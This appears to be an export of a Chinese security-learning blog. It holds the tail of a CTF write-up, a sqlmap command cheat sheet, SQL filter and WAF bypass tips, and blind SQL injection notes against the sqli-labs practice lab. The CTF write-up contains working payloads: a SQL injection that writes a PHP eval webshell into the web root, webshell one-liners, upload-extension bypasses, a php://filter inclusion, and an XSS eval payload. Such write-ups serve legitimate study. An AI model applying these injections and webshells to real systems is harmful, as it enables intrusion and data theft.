根据运算优先级知道，$check 这个变量的值就只取决于 $img_num.所以只要满足$img_num，就相当于$check也满足了。而剩下的$img_first就可以用来构造我们所需要的语句了。
</code></pre><p>最开始的思路是通过注入爆出flag，然后发现出了一堆没用的数据，我大哥的一航同学说，能注入，可以试着利用注入去写入= =，之前我是学过这部分的，咋没想到呢，还是做太少了。。。。<br>然后通过：</p>
<pre><code>http://lol.sycsec.com/api.php?img_num=0&amp;img_first=0%20union%20select%201,@@datadir--+
</code></pre><p>爆出数据库的路径是\/var\/lib\/mysql发现是linux系统，然后用默认路径去试下</p>
<pre><code>http://lol.sycsec.com/api.php?img_num=0&amp;img_first=0%20union%20select%201,%22%3C?php%20eval($_POST[%27admin%27]);?%3E%22%20into%20outfile%20%22/var/www/html/wer.php%22--+
</code></pre><p>并没有写入，然后试下images文件夹</p>
<pre><code>http://lol.sycsec.com/api.php?img_num=0&amp;img_first=0%20union%20select%201,%22%3C?php%20eval($_POST[%27admin%27]);?%3E%22%20into%20outfile%20%22/var/www/html/images/wer.php%22--+
</code></pre><p>写入成功 菜刀连接得到flag</p>
<h3 id="上传-1"><a href="#上传-1" class="headerlink" title="上传(1)"></a>上传(1)</h3><p>尝试各种文件路径 00截断，都不行，因为之前做过百度杯的上传，试了下pht，发现提示离答案更近一步，百度了一下pht上传绕过发现相同的有</p>
<pre><code>php3、php4、php5、phtml、pht
</code></pre><p>试前面几个还是离答案更近，最后试了下phtm得到flag，在linux里，上面的都可以解析为php文件。</p>
<h3 id="上传-2"><a href="#上传-2" class="headerlink" title="上传(2)"></a>上传(2)</h3><p>第一个题目做出来之后给了一个url，去访问了一下发现是自己之前上传的东西，想到去构造一句话木马连接。然后上传一句话访问一下得到了一个</p>
<pre><code>eval($_POST[&apos;admin&apos;])
</code></pre><p>可以得知php被过滤了，因为之前百度杯做过一样的题目，所以用当时的绕过php的一句话</p>
<pre><code>&lt;script language=&quot;phP&quot;&gt; @eval($_POST[&apos;1111&apos;]);&lt;/script&gt;
&lt;script language=&quot;PHP&quot;&gt;require_once(&quot;$_POST[id]&quot;) ;&lt;/script&gt;
</code></pre><p>有两个，百度杯是第二个，这个题目是第一个，所以都写下来吧。<br>连接得到flag</p>
<h3 id="人生苦短"><a href="#人生苦短" class="headerlink" title="人生苦短"></a>人生苦短</h3><p>根据题目可以得知这题需要用Python，因为 人生苦短，我用Python 嘿嘿嘿 根据提示得到一大串base编码，先用base64解了下发现是乱码，因为在南邮上有相似的题想到base64,32,16混合加密，用Python试了下，发现是base32跟base64的混合加密<br>写个小程序跑下得到flag</p>
<pre><code>import base64
code1 = &apos;base编码&apos;
for i in range(0,10):
    code2 = base64.b32decode(code1)
    code1 = base64.b64decode(code2)
print(code1)
</code></pre><h3 id="狗师傅的计算机"><a href="#狗师傅的计算机" class="headerlink" title="狗师傅的计算机"></a>狗师傅的计算机</h3><p>进入链接得到一串神秘代码，百度一下得知是brainfuck代码，然后找一个brainfuck编码器解出这一串代码为welcome.php，根据提示进到一个syc.php界面，并找不到flag，然后扫了下这个url发现他的robots.txt是开着的，进入得到源代码</p>
<pre><code>&lt;?php
//竟然知道brain fuck 和 robots.txt 狗师傅咬你哦 -.-
//这时候狗师傅叼着下面的源码冲到你的面前，审啊，审不出就咬
//-.-
    $num1=$_REQUEST[&apos;num1&apos;];

    $num2=$_REQUEST[&apos;num2&apos;];

    $oper=$_REQUEST[&apos;oper&apos;];

    $str=$_GET[&apos;syc&apos;];

    $pos=strpos($str,&apos;/&apos;);    
    if(0===$pos)
    {
        die(&apos;Do not hack master go :)&apos;);
    }
    if(strpos($str ,&apos;..&apos;) &gt; -1 || strops($str , &apos;=/&apos;) &gt; -1){
    die(&apos;Do not hack master go :)&apos;); 
    }

    $result=include($str . &quot;.php&quot;);

    //echo $str;

    $res=0;
    switch($oper){
        case &quot;+&quot;:
            $res=$num1+$num2;
            break;
        case &quot;-&quot;:
            $res=$num1-$num2;
            break;
        case &quot;*&quot;:
            $res=$num1*$num2;
            break;
        case &quot;/&quot;:
            $res=$num1/$num2;
            break;
        default:
            echo &apos;&lt;br/&gt;no data!&apos;;

    }
    echo &apos;&lt;br/&gt;result=&apos;.$res ;

?&gt; 
&lt;br/&gt;
&lt;a href=&quot;syc.php&quot;&gt;算对了你也找不到flag -.-&lt;/a&gt;
&lt;br/&gt;
&lt;a
href=&quot;robot.txt&quot;&gt;你对php实现计算器感兴趣么,来这里看看
:) &lt;/a&gt;
</code></pre><p>审计发现有一个get请求并且过滤掉了../，想到文件包含用php filter流的文件包含构造如下payload</p>
<pre><code>http://game.sycsec.com:50085/result.php?syc=php://filter/convert.base64-encode/resource=syc.php
</code></pre><p>然后返回no data = =<br>重新看下编码发现 $result=include($str . “.php”); 也就是说会自动加上.php，重新构造</p>
<pre><code>http://game.sycsec.com:50085/result.php?syc=php://filter/convert.base64-encode/resource=syc
</code></pre><p>得到syc.php的源代码的base64编码，解码得到flag</p>
<h3 id="你是人间四月天"><a href="#你是人间四月天" class="headerlink" title="你是人间四月天"></a>你是人间四月天</h3><p>抓包发现url为</p>
<pre><code>http://game.sycsec.com:50080/9392d16bb9fbda00/index.php?sel=no
</code></pre><p>把no改成yes得到</p>
<pre><code>算你识相
但是你还是不相信我是百度！！！
</code></pre><p>想到应该去伪造一个百度，之前在南邮上面做过Google的是在referer里面伪造Google，这个试了下不行，提示说headers host 知道了应该去伪造host内容，然后得到一个新界面url为</p>
<pre><code>http://game.sycsec.com:50080/9392d16bb9fbda00/index.php?selfjtfwef=yes
</code></pre><p>这次把yes改为no得到flag<br>headers host：</p>
<pre><code>一个IP地址可以对应多个域名: 一台虚拟主机(服务器)只有一个ip，上面可以放成千上万个网站。当对这些网站的请求到来时，服务器根据Host这一行中的值来确定本次请求的是哪个具体的网站
</code></pre><h2 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h2><h3 id="linux1-2"><a href="#linux1-2" class="headerlink" title="linux1,2"></a>linux1,2</h3><p>题目提示的是docker镜像，因为从来没接触过docker，所以去百度了一下，原来是linux下的一个容器，我自己的虚拟机只有kali，跟redhat，都没有docker，然后百度下centos跟Ubuntu比较支持docker，之前接触了一点Ubuntu所以就去下载了一个ubuntu= =，然而并不会用，还好RcoIl哥哥给了我一个关于docker使用的网站，那就分享一下啦<a href="http://wangzhezhe.github.io/blog/2015/08/10/docker-operations/" target="_blank" rel="external">docker基础命令</a><br>列一下我这次用到的命令</p>
<pre><code>sudo apt-get install docker //安装docker
docker load -i geek_linux.tar //载入镜像
docker images -a  //查看所有镜像
docker run -i -t IMAGE ID  //根据刚才查到的ID，去运行镜像
</code></pre><p>运行镜像完成后去遍历了一下目录，在/usr/local/etc/里面有一个geek目录，然后ls并没有东西出来，RcoIl哥哥是用find -name “.*”查了下是不是隐藏文件，然后用vim打开，我就比较暴力了，直接去压缩包里面看了下有一个.flag的文件打开就得到了flag= =<br>然后让接着找有一个flag文件，就在root目录下找到了一个F1Ag2.swp，百度了一下，是vim异常退出产生的临时文件</p>
<pre><code>vim -r F1Ag2.swp  //恢复swp文件
</code></pre><p>打开得到flag</p>
<h2 id="Program"><a href="#Program" class="headerlink" title="Program"></a>Program</h2><h3 id="compress300"><a href="#compress300" class="headerlink" title="compress300"></a>compress300</h3><p>解压300次，先是用zipfile 提示不是zip文件，然后去获取了一下文件类型，得到文件类型为tar，当时不知道有tarfile这个函数，然后看下RcoIl的脚本，得知还有tarfile，刚开始还以为要改后缀名，后来发现Python可以自动识别，然后用脚本进行解压，发现解压到295就停止了，看下295的源码发现是zip文件，得到300个应该有zip，有tar，直接借鉴RcoIl哥哥的脚本：</p>
<pre><code>import tarfile
import zipfile
for i in range(1,301)[::-1]: #循环一次i减一
    path=str(i)
    try:                          #解压tar
        tar = tarfile.open(path) 
        tar.extractall()
    except:
        pass
    try:                          #解压zip
        zip = zipfile.ZipFile(path)
        zip.extractall()
    except:
        pass
</code></pre><h3 id="单身二十年"><a href="#单身二十年" class="headerlink" title="单身二十年"></a>单身二十年</h3><p>根据题目可知要写一个脚本，去获取@值并上传，直接上脚本吧</p>
<pre><code>import requests
s=requests.session()
url=&apos;http://web.sycsec.com/0b3a7c6ca7f1f2e6/&apos;
url2=&apos;http://web.sycsec.com/0b3a7c6ca7f1f2e6/judge.php&apos;
qqq=s.get(url).content #通过requests获取到网页源代码
a = qqq.count(&apos;@&apos;)-1   #利用count计数器获取@值
post = {&apos;mytext&apos;:a}    #构造post数据
q = s.post(url2,data=post) #上传post数据到url2
print q.content.decode(&apos;utf-8&apos;) #输出返回值
</code></pre><h2 id="米有做出来的题目"><a href="#米有做出来的题目" class="headerlink" title="米有做出来的题目"></a>米有做出来的题目</h2><h3 id="我好菜啊-杂项部分"><a href="#我好菜啊-杂项部分" class="headerlink" title="我好菜啊_杂项部分"></a>我好菜啊_杂项部分</h3><p>拿到题目知道是异或，也知道异或需要两个文件才能进行，看了write up才想到去找一个正常的png图片去进行异或= =用到的脚本</p>
<pre><code>file_a=open(&apos;s.png&apos;,&apos;rb&apos;)  
file_b=open(&apos;l.png&apos;,&apos;rb&apos;)  

a=file_a.read()  
b=file_b.read()  

s=&apos;&apos;  
for i,j in zip(a,b):  
s+=chr(ord(i)^ord(j))  
print s
</code></pre><h3 id="皓宝宝的留言板"><a href="#皓宝宝的留言板" class="headerlink" title="皓宝宝的留言板"></a>皓宝宝的留言板</h3><p>还没有搞明白，先把官方给的payload贴上</p>
<pre><code>&lt;body onload=”eval(Sting.fromCharCode(编码后的东西))”&gt;&lt;/body&gt;
</code></pre><h2 id="打这个比赛最要感谢的人就是RcoIl啦，从他那里学到了好多我之前都不知道的东西，syc给我最大的礼物就是认识了你，顺便说下-The-dream-is-to-be-realized"><a href="#打这个比赛最要感谢的人就是RcoIl啦，从他那里学到了好多我之前都不知道的东西，syc给我最大的礼物就是认识了你，顺便说下-The-dream-is-to-be-realized" class="headerlink" title="打这个比赛最要感谢的人就是RcoIl啦，从他那里学到了好多我之前都不知道的东西，syc给我最大的礼物就是认识了你，顺便说下 The dream is to be realized"></a>打这个比赛最要感谢的人就是RcoIl啦，从他那里学到了好多我之前都不知道的东西，syc给我最大的礼物就是认识了你，顺便说下 The dream is to be realized</h2>]]></content>
      
        <categories>
            
            <category> CTF </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Write-up </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[sqlmap常见使用语法]]></title>
      <url>http://isron.cn/2016/10/16/sqlmap/</url>
      <content type="html"><![CDATA[<p>总结了一些常见的sqlmap使用语法<br><a id="more"></a></p>
<ol>
<li>sqlmap.py <code>-u url --dbs</code> //爆数据库</li>
<li>sqlmap.py <code>-u url --current-db</code> //爆当前库</li>
<li>sqlmap.py <code>-u url --current-user</code> //爆当前用户</li>
<li>sqlmap.py <code>-u url --users</code>   查看用户权限</li>
<li>sqlmap.py <code>-u url --tables -D 数据库</code> //爆表段</li>
<li>sqlmap.py <code>-u url --columns -T 表段 -D 数据库</code> //爆字段</li>
<li>sqlmap.py <code>-u url --dump -C 字段 -T 表段 -D 数据库</code> //猜解字段</li>
<li>sqlmap.py <code>-u url --dump --start=1 --stop=3 -C 字段 -T 表段 -D 数据库</code> //猜解1到3的字段</li>
</ol>
<p>后续遇到的会进行补充</p>
]]></content>
      
        <categories>
            
            <category> Web安全 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> SQL </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[sql绕过技巧]]></title>
      <url>http://isron.cn/2016/10/15/sql_bypass/</url>
      <content type="html"><![CDATA[<p>做完第一部分sqli—labs时，去做sql注入题发现远没有想像的那么简单，实战中还会有很多的过滤跟waf，记录下我最近遇到的sql过滤跟waf<br><a id="more"></a></p>
<h2 id="注释符被过滤"><a href="#注释符被过滤" class="headerlink" title="注释符被过滤"></a>注释符被过滤</h2><pre><code>解决方案，构造语句让分号完美闭合不去使用注释符。
</code></pre><h2 id="and-or-被过滤"><a href="#and-or-被过滤" class="headerlink" title="and  or  被过滤"></a>and  or  被过滤</h2><pre><code>解决方案：用&amp;&amp;代替and 用 ||代替or 有时需要用url编码过的&amp;&amp;与||
</code></pre><h2 id="空格被过滤"><a href="#空格被过滤" class="headerlink" title="空格被过滤"></a>空格被过滤</h2><pre><code>解决方案：如果注释符没被过滤可以用/**/来代替空格 如果注释符也被过滤掉则需要用 其他字符进行代替
可以使用%09  %0a  %0b  %0c  %0d  %a0代替空格 情况不同，用不同的字符进行代替，或者使用括号分割语句当然分割的语句也要是不需要连一起的 union select 不能用括号分割。
</code></pre><h2 id="union-select-被过滤"><a href="#union-select-被过滤" class="headerlink" title="union select 被过滤"></a>union select 被过滤</h2><pre><code>解决方案：如果对大小写敏感则可以用大小写进行绕过 比如：UnIoN SeLeCt 如果大小写不行还可以用叠加绕过
如：uniunionon selselselectectect 具体要看他们过滤了几次 去叠加几次.
</code></pre><h2 id="union-select-被过滤-1"><a href="#union-select-被过滤-1" class="headerlink" title="union+select 被过滤"></a>union+select 被过滤</h2><pre><code>解决方案：这个是当union 与 select 同时出现时进行过滤
所以可以用union all select 代替 union select 或者利用之前用来代替空格的字符隔开union select。
</code></pre><h2 id="waf之利用正则只去匹配数字"><a href="#waf之利用正则只去匹配数字" class="headerlink" title="waf之利用正则只去匹配数字"></a>waf之利用正则只去匹配数字</h2><pre><code>解决方案：多次对id进行重定义，当其只匹配一次id时可以进行绕过，如：id=1&amp;id=2&amp;id=0
</code></pre><h2 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h2><pre><code>解决方案：利用%df去与%5c组成双字节 从而使后面的攻击代码不被转义 
如：id=-1%df&apos; union select 1,2,3 --+ 当使用的是Mysql_set_charset(&apos;gbk&apos;,&apos;$conn&apos;);函数时可以避免被宽字节注入。
</code></pre><h2 id="反引号绕过"><a href="#反引号绕过" class="headerlink" title="反引号绕过"></a>反引号绕过</h2><pre><code>解决方案：有的题目会将#作为数据库名，然后进行``绕过，反引号是为了区分MySQL的保留字与普通字符而引入的符号。
</code></pre><h2 id="逗号绕过"><a href="#逗号绕过" class="headerlink" title="逗号绕过"></a>逗号绕过</h2><pre><code>解决方案：在使用盲注的时候，需要使用到substr(),mid(),limit。这些子句方法都需要使用到逗号。对于substr()和mid()这两个方法可以使用from to的方式来解决。
</code></pre><h2 id="后续遇到的会进行补充"><a href="#后续遇到的会进行补充" class="headerlink" title="后续遇到的会进行补充"></a>后续遇到的会进行补充</h2>]]></content>
      
        <categories>
            
            <category> Web安全 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> SQL </tag>
            
            <tag> WAF </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[sql盲注学习笔记]]></title>
      <url>http://isron.cn/2016/09/22/sql_mz/</url>
      <content type="html"><![CDATA[<p>简单介绍下sql盲注。<br><a id="more"></a></p>
<h2 id="sql注入之盲注"><a href="#sql注入之盲注" class="headerlink" title="sql注入之盲注"></a>sql注入之盲注</h2><p>　　盲注其实是sql注入的一种，之所以称为盲注是因为他不会根据你sql注入的攻击语句返回你想要知道的错误信息。<br>　　盲注分为两类：<br>   　　　　1.布尔盲注　布尔很明显Ture跟Fales，也就是说它只会根据　　　　你的注入信息返回Ture跟Fales，也就没有了之前的报错信息。<br>　　　　2.时间盲注　界面返回值只有一种,true 无论输入任何值 返回情况都会按正常的来处理。加入特定的时间函数，通过查看web页面返回的时间差来判断注入的语句是否正确。<br>　　需要用到的函数：</p>
<pre><code>Length（）函数 返回字符串的长度
Substr（）截取字符串
Ascii（）返回字符的ascii码
sleep(n)：将程序挂起一段时间 n为n秒
if(expr1,expr2,expr3):判断语句 如果第一个语句正确就执行第二个语句如果错误执行第三个语句
</code></pre><p>　　先在mysql里测试下这几个函数：<br>　　　　这里使用的是security库<br>length函数：<br><img src="http://i2.buimg.com/567571/adbcf6108d98a116.png" alt=""><br>substr函数：<br><img src="http://i2.buimg.com/567571/0734542cbac67246.png" alt=""><br>Ascii：<br><img src="http://i2.buimg.com/567571/dc1637ce49349e12.png" alt=""><br>sleep跟if由于是时间盲注就不一一测试了。</p>
<h3 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h3><p>sqli-less-8为布尔盲注这里就用它做下测试<br>　　刚开始用id=1’/  ’)  “ 测试了一下发现不会爆出错误信息 只有正确跟错误 less-8应该就是布尔盲注了吧  然后通过上面的函数首先构造一个猜测数据库名长度的函数</p>
<pre><code>http://127.0.0.1/Less-8/?id=1&apos;and (length(database()))&gt;10 --+
</code></pre><p><img src="http://i2.buimg.com/567571/d4cfd4d6aacac9bf.png" alt=""><br>返回错误 说明length小于10<br>然后继续猜测是不是大于5</p>
<pre><code>http://127.0.0.1/Less-8/?id=1&apos; and (length(database()))&gt;5 --+
</code></pre><p><img src="http://i2.buimg.com/567571/4fc7359cac8331a2.png" alt=""><br>返回正确说明长度大于5小于10<br>最后得到结果为</p>
<pre><code>http://127.0.0.1/Less-8/?id=1&apos; and (length(database()))=8 --+
</code></pre><p><img src="http://i2.buimg.com/567571/3df977775740cbf4.png" alt=""><br>返回正确 长度为八 也就是security<br>接下来利用substr函数与ascii函数构造猜测数据库名ascii码的值的语句 因为现在只知道长度不知道具体内容<br>构造语句如下</p>
<pre><code>http://127.0.0.1/Less-8/?id=1&apos; and (ascii(substr(database(),1,1)))&gt;100 --+
</code></pre><p>返回正确说明第一个字母的ascii码大于100</p>
<pre><code>http://127.0.0.1/Less-8/?id=1&apos; and (ascii(substr(database(),1,1)))&gt;110 --+
</code></pre><p>返回正确 </p>
<pre><code>http://127.0.0.1/Less-8/?id=1&apos; and (ascii(substr(database(),1,1)))&lt;120 --+
</code></pre><p>返回正确</p>
<pre><code>http://127.0.0.1/Less-8/?id=1&apos; and (ascii(substr(database(),1,1)))&lt;115 --+
</code></pre><p>返回错误</p>
<pre><code>http://127.0.0.1/Less-8/?id=1&apos; and (ascii(substr(database(),1,1)))=115 --+
</code></pre><p>返回正确 通过查ascii码表可知 ascii（115）=s 也就是security 的第一个字母<br>通过改变database（）后面的数字 可以继续猜测第二个字母第三个字母<br>接下来改变语句去猜测表名<br>构造这个语句的时候发现自己还是不够熟练 弄错了好几次</p>
<pre><code>http://127.0.0.1/Less-8/?id=1&apos; and (ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1)))&gt;100 --+
</code></pre><p>返回正确 当等于101的时候返回正确 101为 e 查看mysql 得知第一个表为emails 正确结果 </p>
<pre><code>http://127.0.0.1/Less-8/?id=1&apos; and (ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 1,1),1,1)))=114 --+
</code></pre><p>猜测列名只需要改变几个地方</p>
<pre><code>http://127.0.0.1/Less-8/?id=1&apos; and (ascii(substr((select column_name from information_schema.columns where table_name=&apos;users&apos; limit 0,1),1,1)))&gt;100 --+
</code></pre><p>获取user表的内容 经过猜测 ascii为 105  为i  也就是表的第一个列名 id的第一个字母 同样 通过修改 limit 0,1 获取第二个列名 修改后面1,1的获取当前列的其他字段<br>接着获取 username 与 password 里面的内容 因为知道了列名所以直接 select password from users 就可以获取password里面的内容 username一样<br>具体语句如下</p>
<pre><code>http://127.0.0.1/Less-8/?id=1&apos; and (ascii(substr(( select password from users limit 0,1),1,1)))=68--+  
</code></pre><p>ascii(68)=D  正确<br>手工盲注很繁琐 需要一个一个的试 不过现在还是先学习手工理解了sql注入的原理再去用工具比较好</p>
<h3 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h3><p>sqli-less-9为时间盲注<br>前面已经说过slee（）函数跟if函数了<br>这里就直接构造如下语句</p>
<pre><code>http://127.0.0.1/Less-9/?id=1&apos; and (if(ascii(substr(database(),1,1))&gt;100,sleep(10),null))  --+ 
</code></pre><p>如果返回正确则 页面会停顿10秒，返回错误则会立马返回<br>其他与布尔盲注都是差不多的</p>
<h3 id="post类的布尔盲注与时间盲注"><a href="#post类的布尔盲注与时间盲注" class="headerlink" title="post类的布尔盲注与时间盲注"></a>post类的布尔盲注与时间盲注</h3><p>　　前面说的都是get类的盲注，post类的布尔盲注只是把and换成or其他不变，时间盲注有些不同因为在post类里sleep函数会被放大很多也就是说那个延时时间会很长，不过并不影响我们进行测试。</p>
]]></content>
      
        <categories>
            
            <category> Web安全 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> SQL </tag>
            
        </tags>
        
    </entry>
    
  
  
</search>
